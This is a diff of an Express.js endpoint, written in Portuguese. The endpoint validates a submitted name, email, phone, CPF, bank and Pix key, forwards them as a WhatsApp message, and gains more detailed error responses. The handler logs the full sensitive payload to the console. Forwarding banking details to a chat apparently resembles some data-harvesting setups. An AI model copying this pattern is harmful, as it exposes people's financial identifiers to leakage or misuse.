@@ -285,15 +285,27 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
   console.log("Recebendo requisição para enviar dados bancários");
 
   try {
-    const dados = req.body;
+    const dados = req.body || {};
     console.log("Dados recebidos:", JSON.stringify(dados));
 
-    // Verificar se os dados são válidos
-    if (!dados.nome || !dados.email || !dados.telefone || !dados.cpf || !dados.banco || !dados.pix_tipo || !dados.pix_chave) {
-      console.error("Dados incompletos recebidos");
+    // Verificar quais campos obrigatórios estão faltando
+    const camposObrigatorios = [
+      "nome",
+      "email",
+      "telefone",
+      "cpf",
+      "banco",
+      "pix_tipo",
+      "pix_chave",
+    ];
+    const camposFaltando = camposObrigatorios.filter((campo) => !dados[campo]);
+
+    if (camposFaltando.length > 0) {
+      console.error("Dados incompletos recebidos. Faltando:", camposFaltando);
       return res.status(400).json({
         success: false,
-        message: "Dados pessoais ou de endereço incompletos",
+        message: `Dados incompletos. Campos obrigatórios faltando: ${camposFaltando.join(", ")}`,
+        missingFields: camposFaltando,
       });
     }
 
@@ -304,48 +316,64 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
         success: false,
         message:
           "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
+        error: "whatsapp_disconnected",
       });
     }
 
-   const mensagem =
-  `*Novos dados bancários recebidos*\n\n` +
-  `*Dados Pessoais:*\n` +
-  `Nome: ${dados.nome}\n` +
-  `Email: ${dados.email}\n` +
-  `Telefone: ${dados.telefone}\n` +
-  `CPF: ${dados.cpf}\n\n` +
-  `*Dados Bancários:*\n` +
-  `Banco: ${dados.banco}\n` +
-  `Tipo de Chave Pix: ${dados.pix_tipo}\n` +
-  `Chave Pix: ${dados.pix_chave}\n\n` +
-  `*Endereço Cadastrado:*\n` +
-  `${dados.endereco || "Não informado"}\n\n` +
-  `Enviado em: ${new Date().toLocaleString("pt-BR")}`;
+    const mensagem =
+      `*Novos dados bancários recebidos*\n\n` +
+      `*Dados Pessoais:*\n` +
+      `Nome: ${dados.nome}\n` +
+      `Email: ${dados.email}\n` +
+      `Telefone: ${dados.telefone}\n` +
+      `CPF: ${dados.cpf}\n\n` +
+      `*Dados Bancários:*\n` +
+      `Banco: ${dados.banco}\n` +
+      `Tipo de Chave Pix: ${dados.pix_tipo}\n` +
+      `Chave Pix: ${dados.pix_chave}\n\n` +
+      `*Endereço Cadastrado:*\n` +
+      `${dados.endereco || "Não informado"}\n\n` +
+      `Enviado em: ${new Date().toLocaleString("pt-BR")}`;
 
     console.log("Mensagem formatada, iniciando envio...");
 
     // Enviar mensagem para o WhatsApp
     const resultado = await enviarMensagemWhatsApp(mensagem);
-    console.log("Resultado do envio:", resultado);
+    console.log("Resultado completo do envio:", JSON.stringify(resultado, null, 2));
 
-    if (resultado.success) {
-      res.json({
+    if (resultado && resultado.success) {
+      return res.json({
         success: true,
         message: "Dados enviados com sucesso para o WhatsApp",
       });
-    } else {
-      res.status(500).json({
-        success: false,
-        message: "Erro ao enviar mensagem para o WhatsApp",
-        error: resultado.message,
-      });
     }
+
+    // Monta uma descrição mais específica a partir do objeto `resultado`
+    const detalheErro =
+      resultado?.details ||
+      resultado?.error ||
+      resultado?.message ||
+      "Falha não especificada no envio pelo WhatsApp";
+
+    const codigoErro = resultado?.code || resultado?.status || "WHATSAPP_SEND_ERROR";
+
+    console.error("Falha no envio WhatsApp:", { codigoErro, detalheErro, resultado });
+
+    return res.status(500).json({
+      success: false,
+      message: `Erro ao enviar mensagem para o WhatsApp (${codigoErro})`,
+      error: detalheErro,
+      code: codigoErro,
+      details: resultado?.details ?? null,
+    });
   } catch (error) {
     console.error("Erro ao processar dados bancários:", error);
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       message: "Erro ao processar sua solicitação",
-      error: error.message,
+      error: error?.message || "Erro interno inesperado",
+      code: error?.code || "INTERNAL_SERVER_ERROR",
+      stack: process.env.NODE_ENV === "development" ? error?.stack : undefined,
     });
   }
 });
